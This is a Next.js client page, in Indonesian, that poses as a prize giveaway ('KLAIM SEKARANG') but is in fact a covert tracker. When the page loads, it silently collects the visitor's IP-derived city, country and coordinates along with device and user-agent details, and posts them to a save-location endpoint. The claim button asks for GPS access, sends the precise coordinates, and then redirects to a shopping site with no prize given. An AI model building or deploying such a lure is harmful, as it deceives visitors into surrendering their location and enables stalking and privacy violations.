"use client";

import { useEffect } from "react";
import confetti from "canvas-confetti";

export default function TrackPage() {
  useEffect(() => {
    async function run() {
      try {
        const ipRes = await fetch("/api/get-ip");
        const ipData = await ipRes.json();

        const deviceInfo = getDeviceInfo();

        await fetch("/api/save-location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            device: deviceInfo.device,
            userAgent: deviceInfo.ua,
            ip: ipData.ip,
            ipCity: ipData.ipCity,
            ipCountry: ipData.ipCountry,
            ipLat: ipData.ipLat,
            ipLon: ipData.ipLon,
            gpsLat: null,
            gpsLon: null,
          }),
        });
      // eslint-disable-next-line @typescript-eslint/no-unused-vars
      } catch (e) {}
    }

    run();

    setTimeout(() => {
      confetti({ particleCount: 150, spread: 80, origin: { y: 0.6 } });
    }, 400);
  }, []);

  async function handleClaim() {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          await fetch("/api/save-location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              gpsLat: pos.coords.latitude,
              gpsLon: pos.coords.longitude,
            }),
          });

          confetti({ particleCount: 300, spread: 100 });
          window.location.href = "https://shopee.co.id";
        },
        () => {
          window.location.href = "https://shopee.co.id";
        }
      );
    } else {
      window.location.href = "https://shopee.co.id";
    }
  }

  return (
    <div style={styles.container}>
      <div style={styles.card}>
        <h2 style={styles.title}>🎉 SELAMAT!</h2>
        <p style={styles.text}>Anda mendapatkan kesempatan hadiah menarik!</p>
        <p style={styles.text}>Klik tombol di bawah untuk klaim hadiah Anda.</p>

        <button style={styles.button} onClick={handleClaim}>
          🎁 KLAIM SEKARANG
        </button>
      </div>
    </div>
  );
}

function getDeviceInfo() {
  const ua =
    typeof navigator !== "undefined" ? navigator.userAgent : "unknown";

  const devices = [
    "iPhone",
    "iPad",
    "Samsung",
    "Xiaomi",
    "OPPO",
    "Vivo",
    "Realme",
    "Huawei",
    "Infinix",
    "Poco",
    "Sony",
    "Nokia",
    "Asus",
    "Lenovo",
    "Motorola",
    "Google Pixel",
    "TECNO",
  ];

  let detected = "Unknown Device";
  for (const d of devices) {
    if (ua.toLowerCase().includes(d.toLowerCase())) {
      detected = d;
    }
  }

  if (detected === "Unknown Device" && /Android/i.test(ua))
    detected = "Android Phone";

  return { device: detected, ua };
}

const styles = {
  container: {
    minHeight: "100vh",
    background: "#ffefe0",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    padding: 20,
  },
  card: {
    background: "white",
    padding: "30px 25px",
    borderRadius: 15,
    boxShadow: "0 6px 18px rgba(0,0,0,0.15)",
    textAlign: "center",
    maxWidth: 360,
    width: "100%",
  },
  title: {
    fontSize: 28,
    fontWeight: "bold",
    marginBottom: 10,
  },
  text: {
    fontSize: 16,
    marginBottom: 12,
  },
  button: {
    background: "#ff5722",
    padding: "14px 20px",
    borderRadius: 10,
    color: "white",
    width: "100%",
    border: "none",
    cursor: "pointer",
    fontSize: 18,
    fontWeight: "bold",
  },
} as const;
